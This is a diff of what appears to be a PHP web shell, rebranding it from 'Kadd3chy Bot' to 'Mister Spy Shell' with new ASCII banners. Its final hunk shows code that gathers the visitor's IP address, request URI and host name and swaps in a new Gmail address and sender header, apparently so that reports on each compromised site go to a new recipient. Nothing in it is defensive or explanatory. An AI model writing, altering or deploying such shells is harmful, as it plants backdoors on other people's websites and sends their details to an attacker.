@@ -1,6 +1,6 @@
 <html>
 <head>
-<title>Kadd3chy Mini Shell</title>
+<title>Mister Spy Shell</title>
 <style type="text/css">
 </style>
 </head>
@@ -8,15 +8,18 @@
 	<pre>
 	<center>
 
-Kadd3chy Bot V2.0 | Welcome To The Hell"
-#    #                       #####                      
-#   #    ##   #####  #####  #     #  ####  #    # #   # 
-#  #    #  #  #    # #    #       # #    # #    #  # #  
-###    #    # #    # #    #  #####  #      ######   #   
-#  #   ###### #    # #    #       # #      #    #   #   
-#   #  #    # #    # #    # #     # #    # #    #   #   
-#    # #    # #####  #####   #####   ####  #    #   #    
-                     Kadd3chy Bot V2.0</center>
+Mister Spy Say ="Hello Kids ... :D"
+ 
+ 
+     ___  ____     _              _____
+    |  \/  (_)   | |            /  ___|
+               | .  . |_ ___| |_ ___ _ __  \ `--. _ __  _   _
+                | |\/| | / __| __/ _ \ '__|  `--. \ '_ \| | | |
+                | |  | | \__ \ ||  __/ |    /\__/ / |_) | |_| |
+                \_|  |_/_|___/\__\___|_|    \____/| .__/ \__, |
+                                                 | |     __/ |
+                                                 |_|    |___/
+                                       Bot Mister Spy V5</center>
 
 	</pre>
 </header>
@@ -318,9 +321,9 @@ return $info;
 <?php
 $ip = getenv("REMOTE_ADDR");
 $ra44 = rand(1, 99999);
-$subj98 = " Kadd3chy Bot V2.0 |$ra44";
-$email = "moat3z.kadd3chy@gmail.com";
-$from = "From: Kadd3chy Bot<Kadd3chyv2@Kadd3chybot.com";
+$subj98 = " Bot V3 Rzlt Mr Spy |$ra44";
+$email = "sellerolux@gmail.com";
+$from = "From: Result<botv3@mrspybotv3.com";
 $a45 = $_SERVER['REQUEST_URI'];
 $b75 = $_SERVER['HTTP_HOST'];
 $m22 = $ip . "";
